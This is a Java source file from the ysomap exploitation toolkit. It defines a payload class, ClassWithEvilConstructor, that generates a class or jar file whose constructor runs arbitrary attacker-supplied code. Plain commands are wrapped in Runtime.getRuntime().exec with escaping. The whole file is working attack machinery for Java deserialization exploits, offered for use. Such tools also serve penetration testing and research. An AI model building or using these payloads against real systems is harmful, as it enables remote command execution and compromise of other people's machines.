package ysomap.core.bullet.objects;

import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.util.ClassFiles;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
@Bullets
public class ClassWithEvilConstructor extends Bullet<byte[]> {

    @NotNull
    @Require(name = "classname", detail = "所需生成的类名")
    public String classname;

    @NotNull
    @Require(name = "body", detail = "代码或命令，如果是代码以'code:'打头")
    public String body;

    @NotNull
    @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
    public String type = null;

    @Override
    public byte[] getObject() throws Exception {
        String code = null;
        if(body.startsWith("code:")){
            code = body.substring(5);
        }else{
            code = "java.lang.Runtime.getRuntime().exec(\"" +
                    body.replaceAll("\\\\","\\\\\\\\")
                            .replaceAll("\"", "\\\"") +
                    "\");";
        }
        return ClassFiles.makeClassWithDefaultConstructor(classname, code);
    }
}
